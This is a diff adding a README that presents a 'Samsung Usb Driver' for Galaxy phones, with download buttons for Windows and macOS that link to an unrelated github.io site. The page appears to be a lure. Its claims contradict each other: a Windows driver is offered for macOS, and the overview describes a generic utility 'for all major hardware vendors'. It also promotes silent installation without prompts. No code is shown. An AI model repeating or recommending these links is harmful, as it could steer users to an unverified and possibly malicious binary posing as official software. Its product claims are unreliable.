@@ -1,0 +1,63 @@
+<div align="center">
+
+# Samsung Usb Driver
+
+**Samsung USB Driver for Windows all Galaxy models 2026**
+
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://hornbladesmanhonor.github.io/download-win/)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
+
+</div>
+
+---
+
+## Overview
+
+**Samsung Usb Driver** is a powerful utility that lets you manage, install, and update drivers and system components with ease. Supports all major hardware vendors and Windows versions.
+
+---
+
+## Features
+
+📱 &nbsp;**All Galaxy models** — S/A/Note/Tab/Z series and older
+
+🔌 &nbsp;**MTP & ADB** — both media transfer and debug modes
+
+⚡ &nbsp;**Auto-install** — silent deployment without user prompts
+
+🛠️ &nbsp;**Odin compatible** — required for Samsung firmware flashing
+
+🖥️ &nbsp;**Windows 7-11** — full Windows compatibility
+
+🔄 &nbsp;**Latest version** — includes drivers for newest Galaxy devices
+
+---
+
+## System Requirements
+
+| Component | Minimum |
+|-----------|---------|
+| OS | Windows 7 / 8 / 10 / 11 (x86 & x64) |
+| RAM | 512 MB |
+| Storage | 200 MB free |
+| Internet | Optional (offline pack available) |
+
+---
+
+## Download
+
+<div align="center">
+
+[![Windows Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows)](https://hornbladesmanhonor.github.io/download-win/)
+
+[![macOS Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20macOS-000000?style=for-the-badge&logo=apple)](https://hornbladesmanhonor.github.io/download-mac/)
+
+</div>
+
+---
+
+<div align="center">
+
+*Samsung Usb Driver — fast, reliable, free*
+
+</div>
